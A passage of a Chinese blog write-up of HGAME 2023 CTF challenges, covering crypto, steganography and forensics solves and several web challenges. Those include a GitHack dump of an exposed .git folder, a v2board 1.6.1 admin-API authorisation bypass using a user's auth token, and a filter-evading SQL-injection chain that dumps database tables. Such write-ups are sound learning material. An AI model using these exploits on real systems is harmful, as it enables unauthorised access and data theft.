class="hljs-keyword">elif</span> i==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (stream(i-<span class="hljs-number">2</span>)*<span class="hljs-number">7</span> + stream(i-<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>)<br><br>enc = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    water = stream((i//<span class="hljs-number">2</span>)**<span class="hljs-number">6</span>) % <span class="hljs-number">256</span><br>    enc += <span class="hljs-built_in">bytes</span>([water ^ flag[i]])<br><br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment"># b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br></code></pre></td></tr></table></figure><p>循环加递归，重复太多，直接按这种写法是跑步出来的</p><p>修改成迭代，每次先mod256</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>():<br>    stream = [<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">48</span> // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>)]<br>    stream[<span class="hljs-number">0</span>] = key[<span class="hljs-number">0</span>]<br>    stream[<span class="hljs-number">1</span>] = key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">24</span> ** <span class="hljs-number">6</span>):<br>        stream[i] = (stream[i - <span class="hljs-number">2</span>] * <span class="hljs-number">7</span> + stream[i - <span class="hljs-number">1</span>] * <span class="hljs-number">4</span>) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> stream<br><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>enc = <span class="hljs-string">b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br>s = stream()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>    water = s[(i // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>] % <span class="hljs-number">256</span><br>    <span class="hljs-comment">#print(water)</span><br>    flag += <span class="hljs-built_in">chr</span>(water ^ enc[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="神秘的电话"><a class="markdownIt-Anchor" href="#神秘的电话"></a> 神秘的电话</h3><p>附件是一个morse音频和一个加密密文</p><p>加密密文为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">5</span>Ye<span class="hljs-name">g5</span>Liq<span class="hljs-number">5</span>pif<span class="hljs-number">5</span>pyf<span class="hljs-number">5</span>Ym<span class="hljs-symbol">N77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>pS<span class="hljs-number">25</span>Yiw<span class="hljs-number">5</span>LiA<span class="hljs-number">5</span>Liq<span class="hljs-number">56</span>We<span class="hljs-number">56</span>eY<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>L<span class="hljs-number">2</span><span class="hljs-name">G5</span>piv<span class="hljs-number">6</span>L+Z<span class="hljs-number">5</span>Liq<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">6</span>KKr<span class="hljs-number">6</span>Ye<span class="hljs-symbol">N6</span>Ye<span class="hljs-symbol">N5</span>Yq<span class="hljs-name">g5</span>a+<span class="hljs-name">G77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>Li<span class="hljs-symbol">N55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">5</span>a<span class="hljs-number">6</span>D<span class="hljs-number">55</span>qE<span class="hljs-number">55</span>yf<span class="hljs-number">5</span>q<span class="hljs-number">2</span>j<span class="hljs-number">5</span>ZCr<span class="hljs-number">5</span>LmJ<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>LuA<span class="hljs-number">5</span>LmI<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>ZSv<span class="hljs-number">5</span>LiA<span class="hljs-number">55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>L+h<span class="hljs-number">5</span>oGv<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>YWz<span class="hljs-number">5</span>Lq<span class="hljs-meta">O5</span>a+<span class="hljs-name">G6</span>ZKl<span class="hljs-number">55</span>qE<span class="hljs-number">77</span>ya<span class="hljs-number">4</span>oCc<span class="hljs-number">5</span>Y+q<span class="hljs-number">5</span>pyJ<span class="hljs-number">5</span>YCS<span class="hljs-number">552</span>A<span class="hljs-number">57</span><span class="hljs-number">+76</span>L+H<span class="hljs-number">5</span>Y<span class="hljs-number">2</span>B<span class="hljs-number">5</span>YWr<span class="hljs-number">5</span>bGC<span class="hljs-number">55</span>qE<span class="hljs-number">56</span>+x<span class="hljs-number">56</span>y<span class="hljs-name">G5</span>om<span class="hljs-symbol">N6</span>I<span class="hljs-meta">O95</span>oq<span class="hljs-number">16</span>L<span class="hljs-number">6</span><span class="hljs-number">+5</span>YyX<span class="hljs-number">5</span>qy<span class="hljs-symbol">n56</span>We<span class="hljs-number">6</span>K+d<span class="hljs-number">55</span>qE<span class="hljs-number">57</span>uI<span class="hljs-number">54</span>K<span class="hljs-number">54</span>oCd<span class="hljs-number">44</span>CC<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=<span class="hljs-string">&quot;5Yeg5Liq5pif5pyf5YmN77yM5oiR5Lus5pS25Yiw5LiA5Liq56We56eY55qE5raI5oGv44CC5L2G5piv6L+Z5Liq5raI5oGv6KKr6YeN6YeN5Yqg5a+G77yM5oiR5Lus5LiN55+l6YGT5a6D55qE55yf5q2j5ZCr5LmJ5piv5LuA5LmI44CC5ZSv5LiA55+l6YGT55qE5L+h5oGv5piv5YWz5LqO5a+G6ZKl55qE77ya4oCc5Y+q5pyJ5YCS552A57+76L+H5Y2B5YWr5bGC55qE56+x56yG5omN6IO95oq16L6+5YyX5qyn56We6K+d55qE57uI54K54oCd44CC&quot;</span><br>a=base64.b64decode(a)<br><span class="hljs-built_in">print</span>(a.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-comment">#几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。</span><br></code></pre></td></tr></table></figure><p>音频用Au打开，手动翻译morse密文</p><p><code>-----/..---/..---/...--/./..--.-/.--./.-./../../-.../.-../-.--/..--.-/..--.-/..../---/-./.--/.-/..--.-/.---/--/--./..../..--.-/..-./--./-.-/-.-./--.-/.-/---/--.-/-/--/..-./.-.</code></p><p><a href="https://mosimima.hwcha.com/">在线解码</a> 并转小写<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>“倒着翻过十八层篱笆”应该是栅栏加密，但是搞不出来😭~~~</p><p>wp出来啦，继续补充一下</p><p>没想到“北欧神话”对应维吉尼亚密码…</p><p>“逆序”-&gt;“18层栅栏解密”-&gt;“密钥为vidar的维吉尼亚解密”</p><p><code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><h3 id="兔兔的车票"><a class="markdownIt-Anchor" href="#兔兔的车票"></a> 兔兔的车票</h3><p>由于没有看到题目的注解<code>注：flag.png已经提前保存在source文件夹下，并且命名为picture&#123;x&#125;.png</code></p><p>导致没有思路，官方wp已经出了还是记录一下加深理解</p><p>题⽬的流程是先随机⽣成3张噪声图⽚作为nonce，然后把flag.png和picture{xx}.png打乱再与nonce</p><p>进⾏XOR。因为只有三张nonce，⽽picture有15张，所以⼤概率有picture跟flag.png重⽤了同⼀张</p><p>nonce。就可以⽤这两张加密图⽚进⾏XOR，得到</p><p><em>flag</em>.<em>png</em> ⊕ <em>picturex</em>.<em>png</em></p><img src="/2023/01/05/HGAME/15.png" class=""><p>原题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle, randint, getrandbits<br><br>flagImg = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>width = flagImg.width  <span class="hljs-comment">#379</span><br>height = flagImg.height <span class="hljs-comment">#234</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    colors = long_to_bytes(getrandbits(width * height * <span class="hljs-number">24</span>))[::-<span class="hljs-number">1</span>]<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (colors[x], colors[x + <span class="hljs-number">1</span>], colors[x + <span class="hljs-number">2</span>]))<br>            x += <span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><br>n1 = makeSourceImg()<br>n2 = makeSourceImg()<br>n3 = makeSourceImg()<br>nonce = [n1, n2, n3]<br><br>index = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))<br>shuffle(index)<br>e=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> index:<br>    im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    key = nonce[randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)]<br>    encImg = xorImg(key, im)<br>    encImg.save(<span class="hljs-string">f&#x27;pics/enc<span class="hljs-subst">&#123;e&#125;</span>.png&#x27;</span>)<br>    e+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>只有16张图片，直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>width=<span class="hljs-number">379</span>   <span class="hljs-comment">#宽度和高度查看图片属性可知</span><br>height=<span class="hljs-number">234</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    key = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;j&#125;</span>.png&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        encimg=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br><br>        im=xorImg(key,encimg)<br>        im.save(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;j&#125;</span>.<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/16.png" class=""><h3 id="test-your-ida"><a class="markdownIt-Anchor" href="#test-your-ida"></a> test your IDA</h3><p>查一下64位，IDA打开看到flag</p><img src="/2023/01/05/HGAME/5.png" class=""><h3 id="e99p1ant_want_girlfriend"><a class="markdownIt-Anchor" href="#e99p1ant_want_girlfriend"></a> e99p1ant_want_girlfriend</h3><p>拿到一张图片，看起来那个人下面好像少了一点，直接修改长度</p><img src="/2023/01/05/HGAME/1.png" class=""><img src="/2023/01/05/HGAME/2.png" class=""><h3 id="神秘的海报"><a class="markdownIt-Anchor" href="#神秘的海报"></a> 神秘的海报</h3><p>附件是一张HGAME比赛的海报</p><img src="/2023/01/05/HGAME/7.png" class=""><p>用Stegsolve打开,尝试LSB隐写</p><img src="/2023/01/05/HGAME/8.png" class=""><p>整段话提取出来是</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Sure enough, you still remember  what we  talked a bout at  that <span class="hljs-type">time</span>! This  <span class="hljs-keyword">is</span> part  <span class="hljs-keyword">of</span> the secret: ` hgame&#123;U_ Kn0w_LSB&amp;W`.I put the rest <span class="hljs-keyword">of</span> th e content here,  https://drive.google.com/file/d/<span class="hljs-number">13</span>kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/<span class="hljs-keyword">view</span>?usp=sharing, <span class="hljs-keyword">if</span> you directly <span class="hljs-keyword">access</span> the g oogle drive cloud disk download  <span class="hljs-keyword">in</span> China, it will be very slow,  you can try <span class="hljs-keyword">to</span> u se Scientific Internet <span class="hljs-keyword">access</span> solves the problem <span class="hljs-keyword">of</span> slow <span class="hljs-keyword">or</span> inaccessible <span class="hljs-keyword">access</span>  <span class="hljs-keyword">to</span> <span class="hljs-keyword">external</span> network resources. This <span class="hljs-keyword">is</span> my favorite music, there  <span class="hljs-keyword">is</span> another part  <span class="hljs-keyword">of</span> the secret <span class="hljs-keyword">in</span>  the music, I use Steghide <span class="hljs-keyword">to</span> encrypt, the <span class="hljs-keyword">password</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> the  <span class="hljs-number">6</span>-digit <span class="hljs-keyword">password</span>  we agreed at the <span class="hljs-type">time</span>, even <span class="hljs-keyword">if</span>  someone <span class="hljs-keyword">else</span> finds <span class="hljs-keyword">out</span> here, it  should <span class="hljs-keyword">not</span> be so  easy <span class="hljs-keyword">to</span><br></code></pre></td></tr></table></figure><p>这里给了一半的flag，另一半要访问网站<a href="https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing">https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing</a> ，下载音频（要有梯子，不然下不来）</p><p>里面说了用Steghide加密的，直接上网搜一下Steghide的用法<a href="https://www.jianshu.com/p/c3679f805a0c">https://www.jianshu.com/p/c3679f805a0c</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>steghide   <span class="hljs-comment">#安装</span><br>steghide info <span class="hljs-keyword">Bossanova.wav </span>  <span class="hljs-comment">#查看隐藏的文件</span><br>steghide <span class="hljs-keyword">extract </span>-sf <span class="hljs-keyword">Bossanova.wav </span> <span class="hljs-comment">#提取隐藏的文件</span><br></code></pre></td></tr></table></figure><p>得到flag2.txt <code>恭喜你解到这里，剩下的Flag是 av^Mp3_Stego&#125;，我们Week2见！</code></p><p><code>hgame&#123;U_ Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><h3 id="where-am-i"><a class="markdownIt-Anchor" href="#where-am-i"></a> Where am I</h3><p>给了一个流量包</p><p>因为图片是上传到网盘，所以导出HTTP对象,得到两个文件,一个里面只写了<code>upload successful</code></p><p>另一个则有含有压缩包，<code>binwalk -e file </code>分离，用winhex打开，把头尾多余的文字删除</p><img src="/2023/01/05/HGAME/11.jpg" class=""><img src="/2023/01/05/HGAME/12.png" class=""><p>打开发现文件头错误，应该是伪加密</p><p>将24修改为20</p><img src="/2023/01/05/HGAME/13.png" class=""><p>解压得到图片，linux下用exfitool查看信息</p><img src="/2023/01/05/HGAME/14.png" class=""><p><code>hgame&#123;116_24_1488E_39_54_5418N&#125;</code></p><h3 id="test_nc"><a class="markdownIt-Anchor" href="#test_nc"></a> test_nc</h3><p>直接nc <a href="http://week-1.hgame.lwsec.cn">week-1.hgame.lwsec.cn</a> 31750</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br><span class="hljs-comment">#bin</span><br><span class="hljs-comment">#dev</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#lib</span><br><span class="hljs-comment">#lib32</span><br><span class="hljs-comment">#lib64</span><br><span class="hljs-comment">#vuln</span><br><span class="hljs-built_in">cat</span> flag<br><span class="hljs-comment">#hgame&#123;1b32ad7a265058ea9f2ccc866b97085bb10c4f14&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week-2"><a class="markdownIt-Anchor" href="#week-2"></a> Week 2</h2><h3 id="git-leakage"><a class="markdownIt-Anchor" href="#git-leakage"></a> Git Leakage</h3><p>题目直接说了是Git 泄露</p><p>那就直接<code>python3 Githack.py http://week-2.hgame.lwsec.cn:32140/.git</code></p><p>得到文件Th1s_1s-flag</p><p><code>hgame&#123;Don't^put*Git-in_web_directory&#125;</code></p><h3 id="v2board"><a class="markdownIt-Anchor" href="#v2board"></a> v2board</h3><p>需要越权获得admin的权限，查看admin订阅的token</p><p>先随便注册个邮箱进去看看，都没有什么有用的信息</p><p>猜测是v2board的漏洞，查看源码知道是1.6.1版本的</p><p>上网搜<a href="https://www.ctfiot.com/86202.html">v2board越权访问漏洞</a></p><p>这里的漏洞是</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">鉴权方式变为从Redis中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限<br> <span class="hljs-literal">Admin</span>.php 文件中只验证了 authrization 是否在 Redis的缓存中，所以当注册任意一个用户进行登陆后获取到 auth_data 就可以任意调用 管理员的接口<br></code></pre></td></tr></table></figure><p>先随意注册一个邮箱</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">email:<span class="hljs-keyword">admin</span>@qq.com<br><span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span>@qq.com<br></code></pre></td></tr></table></figure><p>登录后会返回一个auth_data字段<code>YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code></p><p>然后访问/api/v1/admin/user/fetch ,并在请求头加上<code>authorization:YWRtaW4xMjNAcXEuY29tOiQyeSQxMCQ4aU1wd2pPZWx2aUlMQS8yVE9SWHhPSEc3TDVaUkJjWWpvdnJZS2ZvNDdmM012cHR3eUplMg==</code>,</p><p>访问得到</p><img src="/2023/01/05/HGAME/9.png" class=""><p>可以发现有一个<code>admin@example.com</code>不是我们注册的，那就是admin了，订阅链接的token=<code>39d580e71705f6abac9a414def74c466</code></p><h3 id="search-commodity"><a class="markdownIt-Anchor" href="#search-commodity"></a> Search Commodity</h3><p>弱密码爆破<code>admin123</code></p><p>接下来就是sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1/*/**/*/oorrder/*/**/*/by/*/**/*/3%23<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,datadatabasebase(),3%23   se4rch<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(table_name)frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/&#x27;se4rch&#x27;),3%23   5ecret15here,L1st,user1nf0<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(column_name)frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whwhereere/*/**/*/table_name/*/**/*/like/*/**/*/&#x27;5ecret15here&#x27;),3%23f14gggg1shere<br>0/*/**/*/ununionion/*/**/*/seselectlect/*/**/*/1,(seselectlect/*/**/*/group_concat(f14gggg1shere)frfromom/*/**/*/5ecret15here),3%23   hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;<br></code></pre></td></tr></table></figure><h3 id="rabin"><a class="markdownIt-Anchor" href="#rabin"></a> Rabin</h3><p>Rabin加密方案：<br />选择两个大素数p和q做为私钥</p><p>计算n = p * q做为公钥</p><p>若明文为m，则密文为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c ≡ m^{2}(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>实际做题中，加密指数e不仅限于2，所有和n不互素的都有可能</p><p>加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">kbits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = getPrime(kbits)<br>        q = getPrime(kbits)<br>        <span class="hljs-keyword">if</span> p % <span class="hljs-number">4</span> == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q % <span class="hljs-number">4</span>== <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> p, q<br><br>p ,q = gen_key(<span class="hljs-number">256</span>)<br>flag =  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>pt = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(pt, <span class="hljs-number">2</span>, p*q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p=<span class="hljs-subst">&#123;p&#125;</span>\nq=<span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br><span class="hljs-string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br><span class="hljs-string">c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>使用<a href="https://sagecell.sagemath.org/">sagemath</a>求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 